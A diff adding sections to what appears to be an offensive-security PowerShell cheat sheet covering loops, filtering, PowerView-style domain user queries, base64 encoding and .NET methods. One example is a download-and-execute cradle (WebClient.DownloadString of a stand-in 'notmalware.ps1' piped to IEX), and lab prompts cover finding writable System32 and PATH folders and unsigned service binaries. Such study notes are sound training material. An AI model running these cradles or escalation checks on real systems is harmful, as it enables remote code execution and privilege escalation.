@@ -254,6 +254,141 @@ uppercase) version of the string
 variable (not an array)
 ```
 
+# Select string (sls)
+
+Finds text in strings and files
+
+`sls ‘pattern’ .\file.txt -CaseSensitive`
+
+# Logic - if/elseif/else
+
+if{}elseif{}else{}
+
+# Logic switch
+
+$Message = switch -wildcard($a){}
+
+# Logic Try catch finally
+```powershell
+try {
+    $wc = new-object System.Net.WebClient
+    $wc.DownloadFile("http://path")
+}
+
+catch [System.Net.WebException], [System.IO.IoException] {
+    "unable to download"
+}
+catch {
+    "An error occured"
+}
+
+```
+
+# Logic ForEach
+```powershell
+$Processes = get-Process
+ForEach($Process in $Processes) {
+    $Process.Name
+}
+```
+
+# Logic ForEach-Object
+
+ForEach-Object also represented by %. inidvidual object is represented by $_
+
+```powershell
+Get-Process | % {$_.Name}
+```
+
+# Logic While and Do/While
+
+```powershell
+$val =0
+
+while($val -ne 10){
+    $val++
+    $val
+}
+```
+
+# Filtering
+
+Where-Object (?) - filter object with specific properties
+
+`Get-DomainUser | ? {$_.lastlogon -gt [DateTime]::Today.AddDays(-1)}`
+
+ForEach-Object (%) - Executes a scriptblock on each object 
+
+```powershell
+Get-DomainUser -Domain dev.testlab.local | % { if($_.scriptpath) 
+{$_.scriptpath.split("\\")[2] }}
+```
+
+# basic Analysis
+
+```powershell
+get-Process | sort-object handles - descending
+Get-WmiObject win32_process | Group-Object ParentProcessId
+```
+
+# output options
+
+```powershell
+Get-Process | Format-List 
+```
+
+# custom psobject - hashtables
+
+```powershell
+New-Object PSObject -Property ([ordered]@{
+    Name = 'object'
+    Value1 = 'coolstuff'
+    Value2 = 'morecoolstuff'
+})
+```
+
+# interfacing with .NEt static methods
+
+Static methods are accessible with [namespace.Class]::Method()
+
+example base64 encoding a text:
+```powershell
+$Bytes = [System.Text.Encoding]::UNicode.getBytes($Text)
+$EncodedText = [Convert]::ToBase64String($Bytes)
+```
+
+To get the static methods
+`[Text.Encoding] | Get-Member -Static`
+
+To examin the arguments 
+`[Text.Encoding]::Convert`
+
+# Interfacing with .Net instance methods
+
+```
+ $Client = New-Object Net.Webclient
+• $Client | Get-Member (examine object methods/properties)
+• $Client.DownloadString (examine arguments for a method)
+• $String = $Client.DownloadString(“https://legit.site/notmalware.ps1”)
+• IEX $String
+```
+
+## Lab Folder permission enumeration
+
+code that enumerates all directories within System32 or %PATH% that NT AUTHORITY\Authenticated users can write to
+
+## Lab Service binaries 
+
+Code that returns the path of any service binary thats not signed by Microsoft
+
+# powershell remoting
+
+A protocol that allowss running powershell commands on a single or multiple remote systems
+
+
+
+
+
 
 
 
